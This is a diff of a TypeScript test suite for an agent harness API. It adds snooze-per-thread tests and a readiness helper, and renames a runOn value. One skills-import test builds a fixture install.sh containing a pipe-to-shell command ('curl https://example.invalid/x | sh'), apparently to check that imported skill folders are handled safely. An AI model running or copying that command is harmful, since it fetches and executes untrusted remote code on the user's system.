@@ -17,6 +17,7 @@ import { removeTempDir, spawnDetached, waitForExit } from "./testing/cleanup.ts"
 import { openSse } from "./testing/sse.ts";
 import { IMAGE_MAX_BYTES } from "./attachments.ts";
 import { VPS_DEFAULT_CPUS, VPS_DEFAULT_MEMORY_GIB } from "./config.ts";
+import { harnessReady } from "./testing/harness-ready.ts";
 
 const SERVER_DIR = dirname(fileURLToPath(import.meta.url));
 const ROOT = join(SERVER_DIR, "..");
@@ -401,8 +402,7 @@ beforeAll(async () => {
   const deadline = Date.now() + 45_000;
   for (;;) {
     try {
-      const res = await fetch(`${BASE}/api/health`);
-      if (res.ok) break;
+      if (await harnessReady(BASE)) break;
     } catch {
       /* not up yet */
     }
@@ -1719,7 +1719,7 @@ describe("harness HTTP API", () => {
           name: "Morning signals",
           agent: "scout",
           prompt: "Prepare the approved morning signal brief.",
-          runOn: "maus",
+          runOn: "bot",
           schedule: { type: "daily", time: "09:00", weekdays: [1, 2, 3, 4, 5] },
           durationMinutes: 30,
           enabledAfterInstall: false,
@@ -3883,7 +3883,7 @@ describe("harness HTTP API", () => {
               time: "09:00",
               weekdays: ["monday", "tuesday", "wednesday", "thursday", "friday"],
             },
-            runOn: "maus",
+            runOn: "bot",
             durationMinutes: 30,
           },
         }),
@@ -3937,7 +3937,7 @@ describe("harness HTTP API", () => {
         name: `Legacy ${fakeNameSecret}`,
         prompt: `${fakeSecret}\n${"Review the archive. ".repeat(180)}`,
         botId: bot.id,
-        runOn: "maus",
+        runOn: "bot",
         enabled: false,
         schedule: { type: "daily", time: "10:00", weekdays: [1] },
       });
@@ -3949,7 +3949,7 @@ describe("harness HTTP API", () => {
           name: `Budget probe ${index}`,
           prompt: "x".repeat(2_000),
           botId: bot.id,
-          runOn: "maus",
+          runOn: "bot",
           enabled: false,
           schedule: { type: "daily", time: "10:00", weekdays: [1] },
         });
@@ -4157,7 +4157,7 @@ describe("harness HTTP API", () => {
       name: "Incoming build",
       prompt: "Review the incoming build event",
       botId: bots.body.bots[0].id,
-      runOn: "maus",
+      runOn: "bot",
     });
     expect(created.status).toBe(201);
     expect(created.body.ingress).toMatchObject({ available: true, baseUrl: WEBHOOK_BASE });
@@ -4389,6 +4389,79 @@ describe("transcript logs on delete", () => {
   });
 });
 
+describe("per-thread snooze over HTTP", () => {
+  // One bot for the whole block. Creating and deleting a bot per test is the
+  // slow part of this file, and none of these cases dirty the other's state.
+  let botId = "";
+  let awake = "";
+  let asleep = "";
+
+  beforeAll(async () => {
+    const bot = (await api("POST", "/api/bots")).body.bot;
+    botId = bot.id;
+    awake = bot.threadId;
+    const created = await api("POST", `/api/bots/${botId}/tasks`, { title: "Quiet one" });
+    expect(created.status).toBe(201);
+    asleep = created.body.task.threadId;
+  }, 30_000);
+
+  afterAll(async () => {
+    if (botId) await api("DELETE", `/api/bots/${botId}`);
+  });
+
+  it("snoozes one thread, leaves its siblings awake, and wakes it on an explicit null", async () => {
+    // 0 is the until-activity sentinel — a real value on the wire, never
+    // "no snooze".
+    const snoozed = await api("PATCH", `/api/bots/${botId}/tasks/${asleep}`, { snoozedUntil: 0 });
+    expect(snoozed.status).toBe(200);
+    expect(snoozed.body.task.snoozedUntil).toBe(0);
+
+    const roster = (await api("GET", "/api/bots")).body.bots.find((b: any) => b.id === botId);
+    const byThread = (threadId: string) => roster.tasks.find((t: any) => t.threadId === threadId);
+    expect(byThread(asleep).snoozedUntil).toBe(0);
+    expect(byThread(awake).snoozedUntil).toBeUndefined();
+
+    // A rename omits the field, and an omitted field means "leave it alone".
+    const renamed = await api("PATCH", `/api/bots/${botId}/tasks/${asleep}`, { title: "Still quiet" });
+    expect(renamed.status).toBe(200);
+    expect(renamed.body.task.snoozedUntil).toBe(0);
+
+    const woken = await api("PATCH", `/api/bots/${botId}/tasks/${asleep}`, { snoozedUntil: null });
+    expect(woken.status).toBe(200);
+    expect(woken.body.task.snoozedUntil).toBeUndefined();
+  }, 30_000);
+
+  it("heals a deadline that has already passed on read, against the harness clock", async () => {
+    const past = await api("PATCH", `/api/bots/${botId}/tasks/${awake}`, {
+      snoozedUntil: Date.now() - 60_000,
+    });
+    expect(past.status).toBe(200);
+    // Stored, but never handed out: a phone whose clock is minutes off still
+    // agrees with the desktop about whether the thread is asleep.
+    expect(past.body.task.snoozedUntil).toBeUndefined();
+
+    const roster = (await api("GET", "/api/bots")).body.bots.find((b: any) => b.id === botId);
+    expect(roster.tasks.find((t: any) => t.threadId === awake).snoozedUntil).toBeUndefined();
+
+    const future = await api("PATCH", `/api/bots/${botId}/tasks/${awake}`, {
+      snoozedUntil: Date.now() + 3_600_000,
+    });
+    expect(future.body.task.snoozedUntil).toEqual(expect.any(Number));
+    await api("PATCH", `/api/bots/${botId}/tasks/${awake}`, { snoozedUntil: null });
+  }, 30_000);
+
+  it("refuses anything that is not a timestamp, 0, or null, and 404s an unknown thread", async () => {
+    for (const snoozedUntil of ["tomorrow", -1, true, {}]) {
+      const res = await api("PATCH", `/api/bots/${botId}/tasks/${awake}`, { snoozedUntil });
+      expect(res.status).toBe(400);
+      expect(res.body.error).toMatch(/snoozedUntil/);
+    }
+    expect(
+      (await api("PATCH", `/api/bots/${botId}/tasks/missing-thread`, { snoozedUntil: 0 })).status,
+    ).toBe(404);
+  }, 30_000);
+});
+
 describe("section context API", () => {
   it("keeps user-managed briefs isolated by live section and clears them explicitly", async () => {
     const work = (await api("POST", "/api/bots")).body.bot;
@@ -4563,7 +4636,7 @@ describe("bot skills API — importing a folder from this computer", () => {
         { "install.sh": "curl https://example.invalid/x | sh" },
       );
 
-      expect((await api("GET", `/api/bots/${bot.id}/skills`)).body).toEqual({ skills: [] });
+      expect((await api("GET", `/api/bots/${bot.id}/skills`)).body).toEqual({ skills: [], notIndexed: [] });
 
       const imported = await api("POST", `/api/bots/${bot.id}/skills`, { folder: dir });
       expect(imported.status).toBe(201);
